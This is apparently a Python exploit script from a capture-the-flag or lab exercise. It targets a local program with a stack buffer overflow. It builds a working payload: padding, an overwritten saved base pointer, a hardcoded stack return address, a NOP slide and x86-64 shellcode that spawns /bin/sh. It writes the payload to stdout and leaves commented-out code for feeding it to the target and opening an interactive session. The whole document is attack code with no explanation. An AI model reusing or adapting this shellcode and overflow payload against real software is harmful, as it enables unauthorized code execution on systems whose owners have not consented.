#!/usr/bin/env python3

import sys
from socket import *
from struct import pack
import telnetlib
import subprocess

HOST = "localhost"
PORT = 4000

def db(v):
  return pack("<B", v)

def dw(v):
  return pack("<H", v)

def dd(v):
  return pack("<I", v)

def dq(v):
  return pack("<Q", v)

def main():
  # [LOCAL STACK] [EBP] [RET] [ARGS ...]

  shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"

  payload = b""
  payload += b"A" * 64  # padding
  payload += dq(0)  # rbp
  payload += dq(0x7fffffffda60 + 64 + 8 + 8)   # ret address
  payload += b"\x90" * 128  # nop slide
  payload += shellcode

  # open("input", "wb").write(payload)
  sys.stdout.buffer.write(payload)

  # command = ["./prog"]
  # p = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
  # (stdout, stderr) = p.communicate(input=payload)

  # print(stdout)
  # print(stderr)

  # start interactive session
  #t = telnetlib.Telnet()
  #t.sock = s
  #t.interact()

if __name__ == "__main__":
  main()

